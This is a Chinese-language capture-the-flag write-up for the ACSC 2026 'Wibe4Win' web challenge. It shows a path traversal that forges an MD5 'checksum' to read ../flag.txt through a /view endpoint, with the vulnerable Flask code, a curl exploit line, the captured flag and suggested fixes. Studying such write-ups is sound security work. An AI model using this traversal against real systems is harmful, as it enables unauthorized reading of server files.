# ACSC Qualification 2026 - Wibe4Win Writeup

!!! warning "发布提醒"
    官方 Qualification 页面显示本轮时间为 **2026-03-01 18:00 CEST ～ 2026-05-01 18:00 CEST**。当前文档适合作为**本地归档草稿**；若比赛尚未结束，请勿提前公开发布。

## 题目信息
- **比赛**: ACSC Qualification 2026（Austria Cyber Security Challenge 2026 Qualification）
- **题目**: Wibe4Win
- **类别**: Web
- **难度**: 简单
- **附件/URL**: `app.py` · `Dockerfile` · `docker-compose.yml` · `templates/` · `snippets/` · [在线靶机](https://be0s8cwbxaasof6s.dyn.acsc.land){target="_blank"}
- **附件链接**: [下载 app.py](https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/wibe4win/app.py){download} · [下载 Dockerfile](https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/wibe4win/Dockerfile){download} · [下载 docker-compose.yml](https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/wibe4win/docker-compose.yml){download} · [仓库位置](https://github.com/starnotes-xj/BIGC_CTF_Writeups/tree/main/CTF_Writeups/files/wibe4win){target="_blank"}
- **Flag格式**: `dach2026{...}`
- **状态**: 已解

## Flag

```text
dach2026{v1b3_c0d1ng_g0n3_wr0ng_3ipsb6ql60tggsus}
```

## 解题过程

### 1. 初始侦察/文件识别
- 打开首页后能看到 3 个代码片段卡片：`auth_system.js`、`blockchain.py`、`todo_app.py`
- 每个卡片链接都长这样：

```text
/view?file=auth_system.js&checksum=6f6568d149c936746716f8957259a739
```

- 这说明后端想通过 `checksum` 参数来“保护”文件读取接口
- 随手验证一下会发现，这个 `checksum` 恰好就是文件名本身的 MD5：

```text
md5("auth_system.js") = 6f6568d149c936746716f8957259a739
md5("blockchain.py")  = 7ca358c02ce04d691e8c885e398bd2b1
md5("todo_app.py")    = 593d319ad9403d6b8af1224041a26a68
```

- 也就是说，这个“校验”根本不是服务端秘密，只是**对用户输入又算了一遍公开 MD5**

### 2. 关键突破点一
- 核心逻辑在 `app.py` 的 `/view`：

```python
@app.route("/view")
def view():
    filename = request.args.get("file", "")
    if not filename:
        return "no file specified, bad vibes", 400

    expected = hashlib.md5(filename.encode()).hexdigest()
    provided = request.args.get("checksum", "")
    if provided != expected:
        return "Forbidden - invalid checksum (nice try hacker)", 403

    filepath = os.path.join(SNIPPETS_DIR, filename)
    try:
        with open(filepath, "r") as f:
            return f.read(), 200, {"Content-Type": "text/plain"}
```

- 这里的问题有两个：

1. **校验值完全由用户可计算**
   - `expected = md5(filename)`
   - 攻击者自己知道 `filename`，自然也能自己算 `checksum`

2. **文件路径直接拼接**
   - `os.path.join(SNIPPETS_DIR, filename)`
   - 没有做路径规范化，也没有限制 `..`

- 因此可以构造任意相对路径，例如：

```text
../app.py
../flag.txt
```

### 3. 关键突破点二
- 题目启动时会把 flag 写进应用目录下的 `flag.txt`：

```python
FLAG = os.environ.get("FLAG", "dach2026{fake_flag}")
flag_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "flag.txt")
with open(flag_path, "w") as f:
    f.write(FLAG)
```

- 同时：

```python
SNIPPETS_DIR = /app/snippets
```

- 所以：

```text
os.path.join("/app/snippets", "../flag.txt")
```

会解析到：

```text
/app/flag.txt
```

- 我们只需要给 `../flag.txt` 算一个 MD5，然后传给 `/view` 即可：

```text
file=../flag.txt
checksum=md5("../flag.txt")
```

计算得到：

```text
md5("../flag.txt") = 5afc6dd4da679fc5ee09267ff4bf7c6a
```

### 4. 获取 Flag
- 最终访问：

```text
https://be0s8cwbxaasof6s.dyn.acsc.land/view?file=../flag.txt&checksum=5afc6dd4da679fc5ee09267ff4bf7c6a
```

- 服务端返回：

```text
dach2026{v1b3_c0d1ng_g0n3_wr0ng_3ipsb6ql60tggsus}
```

## 攻击链/解题流程总结

```text
观察首页 snippet 链接 → 发现 checksum 实际上就是 md5(file) → 阅读 app.py 确认 /view 直接用 os.path.join 拼接路径 → 构造 ../flag.txt 路径穿越 → 自己计算 md5("../flag.txt") → 访问 /view 读取 /app/flag.txt → Flag
```

## 漏洞分析 / 机制分析

### 根因
- 把 **MD5(用户输入)** 误当成“安全校验”
- 文件读取接口直接拼接用户给出的文件名，没有阻止 `..`
- 把敏感文件 `flag.txt` 放在 Web 进程可读目录里

### 影响
- 攻击者可以伪造任意 `checksum`
- 攻击者可利用路径穿越读取 `snippets/` 目录之外的任意可读文件
- 本题中直接可读取 `/app/flag.txt`，也可先读 `/app/app.py` 来确认逻辑

### 修复建议（适用于漏洞类题目）
- 不要把公开哈希当作鉴权或签名；如果确实要做完整性校验，应使用带服务端密钥的 HMAC
- 文件读取应使用白名单，而不是直接拼接用户路径
- 对路径做规范化校验，确保最终路径仍位于 `SNIPPETS_DIR` 内部
- 不要把敏感信息写到 Web 目录或应用工作目录里

## 知识点
- 路径穿越（Path Traversal / Arbitrary File Read）
- “可计算 checksum” 不等于鉴权
- `os.path.join()` 本身不会阻止 `..` 逃逸目录

## 使用的工具
- Python 标准库 `urllib` / `hashlib` — 访问靶机并计算 MD5
- 浏览器开发者工具 / 查看页面源码 — 观察 snippet 链接中的 `file` 与 `checksum`
- 本地阅读 `app.py` — 确认文件读取逻辑与 flag 文件位置

## 脚本归档
- Go：[`ACSC2026Qualification_Wibe4Win.go` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_go/ACSC2026Qualification_Wibe4Win.go){target="_blank"}
- Python：[`ACSC2026Qualification_Wibe4Win.py` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/ACSC2026Qualification_Wibe4Win.py){target="_blank"}
- 说明：两个脚本都使用标准库，默认会先验证首页 snippet 链接中的 checksum 规律，再读取 `../flag.txt`

## 命令行提取关键数据（无 GUI）

```bash
go run CTF_Writeups/scripts_go/ACSC2026Qualification_Wibe4Win.go -base https://be0s8cwbxaasof6s.dyn.acsc.land

python CTF_Writeups/scripts_python/ACSC2026Qualification_Wibe4Win.py --base https://be0s8cwbxaasof6s.dyn.acsc.land

python - <<'PY'
import hashlib
print(hashlib.md5(b"../flag.txt").hexdigest())
PY

curl "https://be0s8cwbxaasof6s.dyn.acsc.land/view?file=../flag.txt&checksum=5afc6dd4da679fc5ee09267ff4bf7c6a"
```

## 推荐工具与优化解题流程

> 参考 `CTF_TOOLS_EXTENSION_PLAN.md` 中的对应类别工具推荐。

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 | 缺点 |
|------|----------|----------|------|------|
| Python 标准库脚本 | 完整利用 | 秒级 | 标准库即可完成校验与读 flag | 需要自己写少量逻辑 |
| Go 标准库脚本 | 完整利用 | 秒级 | 单文件、易归档、TLS/HTTP 处理直接 | 参数较长时命令行略显冗长 |
| 浏览器 / DevTools | 初始侦察 | < 1 分钟 | 直接看到 snippet 链接与参数 | 不适合自动化验证 |
| curl | 最终读取 | 秒级 | 一条命令直接打出 flag | 逻辑验证不如脚本完整 |

### 推荐流程

**推荐流程**：先看首页 snippet 链接确认 `checksum = md5(file)` → 再读 `app.py` 确认 `/view` 的路径拼接逻辑 → 构造 `../flag.txt` 与对应 MD5 → 直接读取 flag（通常 3 分钟内可完成）。 

### 工具 A（推荐首选）
- **安装**：Python 3.10+
- **详细步骤**：
  1. 拉取首页并提取 snippet 链接
  2. 验证链接里的 `checksum` 等于 `md5(file)`
  3. 构造 `../app.py`、`../flag.txt`
  4. 访问 `/view?file=...&checksum=...` 完成文件读取
- **优势**：最适合把分析过程和利用过程一起沉淀为脚本

### 工具 B（可选）
- **安装**：系统自带 `curl`
- **详细步骤**：
  1. 手工计算 `md5("../flag.txt")`
  2. 直接请求 `/view`
  3. 查看响应中的 flag
- **优势**：极简、适合比赛中快速打点
